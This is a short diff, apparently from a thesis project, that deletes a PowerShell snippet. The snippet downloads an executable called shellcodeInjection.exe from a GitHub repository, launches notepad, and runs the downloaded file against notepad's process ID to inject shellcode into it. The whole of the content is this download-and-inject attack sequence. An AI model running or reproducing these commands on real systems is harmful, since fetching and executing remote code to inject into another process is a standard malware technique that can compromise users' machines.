@@ -1,7 +1,0 @@
-
-
-wget -Uri https://github.com/PaulaMerino/TFM/raw/main/exec/shellcodeInjection.exe -OutFile "$env:USERPROFILE\Downloads\shellcodeInjection.exe"
-
-notepad.exe
-
-.\shellcodeInjection.exe (Get-process | ?{$_.ProcessName -eq "notepad"} | Select-Object -ExpandProperty Id)
